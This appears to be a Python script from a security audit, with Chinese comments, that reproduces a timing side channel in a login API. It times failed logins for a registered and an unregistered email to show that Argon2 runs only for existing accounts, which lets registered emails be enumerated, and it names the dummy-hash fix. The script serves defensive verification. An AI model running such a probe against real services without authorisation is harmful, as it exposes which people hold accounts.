#!/usr/bin/env python3
"""复现：登录接口的响应时间泄露邮箱是否已注册。

不存在的账户会在查库后直接返回，跳过 Argon2；存在的账户要跑完一轮 Argon2。
两者都返回 401，但耗时相差一个数量级，足以枚举已注册邮箱。

两组都用错误密码，所以差异只来自「是否执行了 Argon2」。
"""

import json
import os
import statistics
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from _common import env_config, fail, not_reproduced, reproduced

ROUNDS = 15
WRONG_PASSWORD = "definitely-not-the-right-password"

BASE, KNOWN_EMAIL, _password = env_config()
UNKNOWN_EMAIL = f"no-such-user-{os.getpid()}@example.invalid"


def timed_login(email: str) -> float:
    body = json.dumps({"email": email, "password": WRONG_PASSWORD}).encode()
    request = urllib.request.Request(f"{BASE}/api/v1/auth/login", data=body, method="POST")
    request.add_header("Content-Type", "application/json")
    start = time.perf_counter()
    try:
        urllib.request.urlopen(request, timeout=30).read()
    except urllib.error.HTTPError as error:
        error.read()
    except urllib.error.URLError as error:
        fail(f"无法连接 {BASE}: {error.reason}")
    return (time.perf_counter() - start) * 1000


print(f"计时边信道测量 -> {BASE}")
print(f"已注册: {KNOWN_EMAIL}")
print(f"未注册: {UNKNOWN_EMAIL}")
print(f"每组 {ROUNDS} 次，均使用错误密码，两者都返回 401\n")

for _ in range(3):  # 预热连接
    timed_login(KNOWN_EMAIL)
    timed_login(UNKNOWN_EMAIL)

known, unknown = [], []
for _ in range(ROUNDS):
    known.append(timed_login(KNOWN_EMAIL))      # 交替测量，摊平负载漂移
    unknown.append(timed_login(UNKNOWN_EMAIL))

for label, samples in (("已注册", known), ("未注册", unknown)):
    print(
        f"{label}: 中位数 {statistics.median(samples):7.2f} ms  "
        f"最小 {min(samples):7.2f}  最大 {max(samples):7.2f}"
    )

median_known = statistics.median(known)
median_unknown = statistics.median(unknown)
ratio = median_known / max(median_unknown, 0.001)
separated = min(known) > max(unknown)

print(f"\n中位数差 {median_known - median_unknown:.2f} ms，倍数 {ratio:.1f}x")
print(f"两组分布是否完全分离: {'是' if separated else '否'}")
if separated:
    print("→ 单次请求即可判定邮箱是否注册，无需统计平均")

if ratio > 3:
    reproduced(
        "已复现：Argon2 只在账户存在时执行，构成可枚举邮箱的计时边信道。",
        "  修复需要对不存在的账户也执行一次等价开销的 dummy hash。",
    )
not_reproduced(f"未观察到显著差异（{ratio:.1f}x）")
